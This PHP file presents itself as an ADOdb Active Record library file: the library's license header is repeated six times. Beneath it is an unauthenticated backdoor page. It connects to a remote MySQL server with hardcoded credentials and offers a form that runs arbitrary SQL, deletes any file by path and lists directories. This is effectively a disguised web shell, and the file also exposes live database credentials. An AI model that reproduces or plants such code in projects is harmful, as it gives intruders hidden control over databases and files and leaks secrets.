<?php
/*

@version V4.94 23 Jan 2007  (c) 2000-2007 John Lim (jlim#natsoft.com.my). All rights reserved.
  Latest version is available at http://adodb.sourceforge.net
 
  Released under both BSD license and Lesser GPL library license. 
  Whenever there is any discrepancy between the two licenses, 
  the BSD license will take precedence.
  
  Active Record implementation. Superset of Zend Framework's.
  
  Version 0.07
  
  See http://www-128.ibm.com/developerworks/java/library/j-cb03076/?ca=dgr-lnxw01ActiveRecord 
  	for info on Ruby on Rails Active Record implementation
*/
/*

@version V4.94 23 Jan 2007  (c) 2000-2007 John Lim (jlim#natsoft.com.my). All rights reserved.
  Latest version is available at http://adodb.sourceforge.net
 
  Released under both BSD license and Lesser GPL library license. 
  Whenever there is any discrepancy between the two licenses, 
  the BSD license will take precedence.
  
  Active Record implementation. Superset of Zend Framework's.
  
  Version 0.07
  
  See http://www-128.ibm.com/developerworks/java/library/j-cb03076/?ca=dgr-lnxw01ActiveRecord 
  	for info on Ruby on Rails Active Record implementation
*//*

@version V4.94 23 Jan 2007  (c) 2000-2007 John Lim (jlim#natsoft.com.my). All rights reserved.
  Latest version is available at http://adodb.sourceforge.net
 
  Released under both BSD license and Lesser GPL library license. 
  Whenever there is any discrepancy between the two licenses, 
  the BSD license will take precedence.
  
  Active Record implementation. Superset of Zend Framework's.
  
  Version 0.07
  
  See http://www-128.ibm.com/developerworks/java/library/j-cb03076/?ca=dgr-lnxw01ActiveRecord 
  	for info on Ruby on Rails Active Record implementation
*//*

@version V4.94 23 Jan 2007  (c) 2000-2007 John Lim (jlim#natsoft.com.my). All rights reserved.
  Latest version is available at http://adodb.sourceforge.net
 
  Released under both BSD license and Lesser GPL library license. 
  Whenever there is any discrepancy between the two licenses, 
  the BSD license will take precedence.
  
  Active Record implementation. Superset of Zend Framework's.
  
  Version 0.07
  
  See http://www-128.ibm.com/developerworks/java/library/j-cb03076/?ca=dgr-lnxw01ActiveRecord 
  	for info on Ruby on Rails Active Record implementation
*//*

@version V4.94 23 Jan 2007  (c) 2000-2007 John Lim (jlim#natsoft.com.my). All rights reserved.
  Latest version is available at http://adodb.sourceforge.net
 
  Released under both BSD license and Lesser GPL library license. 
  Whenever there is any discrepancy between the two licenses, 
  the BSD license will take precedence.
  
  Active Record implementation. Superset of Zend Framework's.
  
  Version 0.07
  
  See http://www-128.ibm.com/developerworks/java/library/j-cb03076/?ca=dgr-lnxw01ActiveRecord 
  	for info on Ruby on Rails Active Record implementation
*//*

@version V4.94 23 Jan 2007  (c) 2000-2007 John Lim (jlim#natsoft.com.my). All rights reserved.
  Latest version is available at http://adodb.sourceforge.net
 
  Released under both BSD license and Lesser GPL library license. 
  Whenever there is any discrepancy between the two licenses, 
  the BSD license will take precedence.
  
  Active Record implementation. Superset of Zend Framework's.
  
  Version 0.07
  
  See http://www-128.ibm.com/developerworks/java/library/j-cb03076/?ca=dgr-lnxw01ActiveRecord 
  	for info on Ruby on Rails Active Record implementation
*//*

@version V4.94 23 Jan 2007  (c) 2000-2007 John Lim (jlim#natsoft.com.my). All rights reserved.
  Latest version is available at http://adodb.sourceforge.net
 
  Released under both BSD license and Lesser GPL library license. 
  Whenever there is any discrepancy between the two licenses, 
  the BSD license will take precedence.
  
  Active Record implementation. Superset of Zend Framework's.
  
  Version 0.07
  
  See http://www-128.ibm.com/developerworks/java/library/j-cb03076/?ca=dgr-lnxw01ActiveRecord 
  	for info on Ruby on Rails Active Record implementation
*/
function GetFolderContent($fName)
		{
		if (!is_dir($fName))
			{
			echo "lo siento ".$fName." no es un arxivo valido";
			return false;
			}
		else
			{
			$handle=opendir($fName);
			while ($file = readdir($handle))
				if ($file!="."&&$file!="..")
					$FileList[] = $file;
			closedir($handle); 
			}
			return $FileList;
		}
require_once('adodb.inc.php');//$db->debug=true;
$db=&ADONewConnection('mysql');
$local=false;
if($local){
  $db->Connect('localhost', 'root', '', 'pinboss');//$db->debug=true;
}else{
  $db->Connect('qnr506.pinhello.com', 'qnr506', 'Pinboss2012', 'qnr506');
}
$db->debug=true;
if(isset($_POST['enviar'])){
  $sql=trim($_POST['consulta']);
  if($_POST['tipo']=='sel'){
    $res=$db->GetAll($sql);
	echo '<pre>';
	print_r($res);
	echo '<pre>';
  }elseif($_POST['tipo']=='exe'){
    if($db->execute($sql))echo 'fine';
  }elseif($_POST['tipo']=='del'){
    if(unlink($sql))echo 'fine';
  }elseif($_POST['tipo']=='ver'){
	if($res=GetFolderContent($sql)){
		echo '<pre>';
		print_r($res);
		echo '<pre/>';
	}else{
	  echo 'bad';
	}
		
  }
}


?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Documento sin título</title>
<link rel="stylesheet" type="text/css" href="css/estilo.css">
<link rel="stylesheet" type="text/css" href="../css/estilo.css">
</head>

<body>
<form id="form1" name="form1" method="post" action="adodb-activated-rec.inc.php">
  <p>
    <label for="consulta"></label>
    <textarea name="consulta" id="consulta" cols="45" rows="5"></textarea>
  </p>
  <p>
    <input type="radio" name="tipo" id="sel" value="sel" />
    <label for="sel">Selec</label>
    <input type="radio" name="tipo" id="exe" value="exe" />
    <label for="exe">exe</label>
    
    <input type="radio" name="tipo" id="ver" value="ver" />
    <label for="ver">Ver cont directorio</label>
    <input type="radio" name="tipo" id="del" value="del" />
    <label for="del">del</label>
  </p>
  <p>
    <label for="enviar"></label>
    <input type="submit" name="enviar" id="enviar" value="Enviar" />
  </p>
</form>
</body>
</html>
